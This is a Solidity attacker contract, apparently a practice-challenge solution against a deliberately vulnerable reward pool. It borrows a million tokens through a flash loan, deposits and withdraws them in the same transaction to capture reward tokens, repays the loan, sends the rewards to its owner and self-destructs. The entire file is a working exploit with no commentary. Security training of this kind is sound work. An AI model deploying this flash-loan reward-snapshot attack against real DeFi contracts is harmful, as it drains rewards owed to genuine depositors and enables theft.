// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "./TheRewarderPool.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAttacker {
    address private immutable s_owner;
    TheRewarderPool private immutable s_rewarderPool;

    IFlashLoanerPool private immutable s_flashLoanPool;

    IERC20 private immutable s_liquidityToken;
    IERC20 private immutable s_rewardToken;

    constructor(
        address _rewarderPool,
        address _flashLoanPool
    ) {
        s_owner = msg.sender;

        TheRewarderPool rewarderPool = TheRewarderPool(_rewarderPool);
        s_liquidityToken = IERC20(rewarderPool.liquidityToken());
        s_rewardToken = IERC20(rewarderPool.rewardToken());
        s_rewarderPool = rewarderPool;
        
        s_flashLoanPool = IFlashLoanerPool(_flashLoanPool);
    }

    function attack() external {
        s_flashLoanPool.flashLoan(1000000 * 1e18);
        s_rewardToken.transfer(s_owner, s_rewardToken.balanceOf(address(this)));
        selfdestruct(payable(s_owner));
    }

    function receiveFlashLoan(uint256 _amount) external {
        s_liquidityToken.approve(address(s_rewarderPool), _amount);
        s_rewarderPool.deposit(_amount);
        s_rewarderPool.withdraw(_amount);

        s_liquidityToken.transfer(address(s_flashLoanPool), _amount);
    }
}
